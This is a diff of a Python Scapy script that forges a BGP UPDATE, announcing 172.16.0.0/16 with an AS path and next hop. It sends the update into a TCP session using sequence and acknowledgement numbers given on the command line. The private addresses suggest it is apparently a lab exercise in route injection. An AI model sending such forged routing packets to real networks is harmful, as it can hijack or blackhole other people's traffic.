@@ -17,8 +17,8 @@ tcp = TCP(dport=179, sport=int(sys.argv[3]), seq=int(sys.argv[1]), ack=int(sys.a
 BGPHeader = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)
 
 Origin = BGPPathAttr(type_flags=64, type_code=1, attribute=BGPPAOrigin(0))
-Path = BGPPathAttr(type_flags=64, type_code=2, attribute=BGPPAAS4BytesPath(segments=['1000', '1050']))
-nextHop = BGPPathAttr(type_flags=64, type_code=4, attribute=BGPPANextHop(next_hop="192.168.4.2"))
+Path = BGPPathAttr(type_flags=64, type_code=2, attribute=BGPPAAS4Path(segment_length=3,segment_value=[1111,1000,1050]))
+nextHop = BGPPathAttr(type_flags=64, type_code=3, attribute=BGPPANextHop(next_hop='192.168.4.2'))
 nlriV = BGPNLRI_IPv4(prefix="172.16.0.0/16")
 localPref = BGPPathAttr(type_flags=64, type_code=5, attribute=BGPPALocalPref(local_pref=100))
 
@@ -26,13 +26,13 @@ localPref = BGPPathAttr(type_flags=64, type_code=5, attribute=BGPPALocalPref(loc
 
 #BGPUpB = BGPUpdate(path_attr=[BGPPathAttr(type_flags=64, type_code=5, attribute=BGPPALocalPref(local_pref=100))], nlri=BGPNLRI_IPv4(prefix='172.16.0.0/16'))
 
-UpdateBGP = BGPUpdate(path_attr=[Origin, nextHop, Path], nlri=BGPNLRI_IPv4(prefix="172.16.0.0/16"))
+UpdateBGP = BGPUpdate(path_attr=[Origin, Path, nextHop], nlri=BGPNLRI_IPv4(prefix="172.16.0.0/16"))
 
 #pkt=IP(dst=dIP,src=sIP,ttl=1) / TCP(dport=dstPort,sport=srcPort) / BGPHeader / BGPNotif
 #pkt.show2()
 
 packet = base / tcp / BGPHeader / UpdateBGP
-packet.show2()
+packet.show()
 send(packet)
 
 #BGPPALocalPref(local_pref=100), 
